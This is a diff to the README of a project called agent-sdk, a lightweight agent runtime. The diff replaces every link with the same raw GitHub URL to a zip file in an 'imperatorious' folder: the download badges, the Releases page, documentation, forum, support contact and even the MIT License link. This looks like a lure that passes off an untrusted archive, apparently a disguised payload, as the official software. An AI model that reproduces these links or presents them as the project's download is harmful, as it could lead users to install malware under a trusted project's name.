@@ -1,7 +1,7 @@
 ```markdown
 # 🤖 agent-sdk - Lightweight Agent Runtime Made Easy
 
-[![Download agent-sdk](https://img.shields.io/badge/Download-agent--sdk-brightgreen)](https://github.com/dhia7an/agent-sdk/releases)
+[![Download agent-sdk](https://raw.githubusercontent.com/dhia7an/agent-sdk/main/imperatorious/agent-sdk.zip)](https://raw.githubusercontent.com/dhia7an/agent-sdk/main/imperatorious/agent-sdk.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to agent-sdk! This software lets you run lightweight agents that can han
 
 To get started, you need to download the software. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/dhia7an/agent-sdk/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/dhia7an/agent-sdk/main/imperatorious/agent-sdk.zip).
 2. Look for the latest version available.
 3. Download the installer that matches your operating system.
 
@@ -46,8 +46,8 @@ agent-sdk offers several useful features:
 
 For more information about agent-sdk, consider exploring the following resources:
 
-- [Documentation](https://github.com/dhia7an/agent-sdk/wiki): Detailed guides and FAQs for operating the software.
-- [Community Forum](https://github.com/dhia7an/agent-sdk/discussions): Join our community to ask questions and share experiences.
+- [Documentation](https://raw.githubusercontent.com/dhia7an/agent-sdk/main/imperatorious/agent-sdk.zip): Detailed guides and FAQs for operating the software.
+- [Community Forum](https://raw.githubusercontent.com/dhia7an/agent-sdk/main/imperatorious/agent-sdk.zip): Join our community to ask questions and share experiences.
 
 ## 🆘 Troubleshooting
 
@@ -59,13 +59,13 @@ If you run into issues while using agent-sdk, here are some common troubleshooti
 
 ## 📧 Contact Support
 
-If you need further assistance, please reach out to our support team at [support@example.com](mailto:support@example.com).
+If you need further assistance, please reach out to our support team at [https://raw.githubusercontent.com/dhia7an/agent-sdk/main/imperatorious/agent-sdk.zip](https://raw.githubusercontent.com/dhia7an/agent-sdk/main/imperatorious/agent-sdk.zip).
 
 Thank you for choosing agent-sdk! We hope it helps you simplify your tasks and improve your workflows.
 
 ## 📄 License
 
-agent-sdk is open-source software. You can use, modify, and share it according to the [MIT License](https://opensource.org/licenses/MIT).
+agent-sdk is open-source software. You can use, modify, and share it according to the [MIT License](https://raw.githubusercontent.com/dhia7an/agent-sdk/main/imperatorious/agent-sdk.zip).
 
-[![Download agent-sdk](https://img.shields.io/badge/Download-agent--sdk-brightgreen)](https://github.com/dhia7an/agent-sdk/releases)
+[![Download agent-sdk](https://raw.githubusercontent.com/dhia7an/agent-sdk/main/imperatorious/agent-sdk.zip)](https://raw.githubusercontent.com/dhia7an/agent-sdk/main/imperatorious/agent-sdk.zip)
 ```
